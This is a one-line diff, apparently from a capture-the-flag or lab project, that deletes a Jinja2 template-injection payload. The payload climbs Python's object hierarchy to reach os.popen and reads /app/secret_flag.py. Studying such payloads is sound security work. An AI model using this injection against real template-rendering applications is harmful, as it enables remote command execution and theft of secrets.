@@ -1,1 +1,0 @@
-{% set sc = "".__class__.__mro__[1].__subclasses__() %}{% for c in sc %}{% if c.__name__ == "str" and "os" in c.__init__.__globals__ %}{{ c.__init__.__globals__.os.popen("cat /app/secret_flag.py").read() }}{% endif %}{% endfor %}
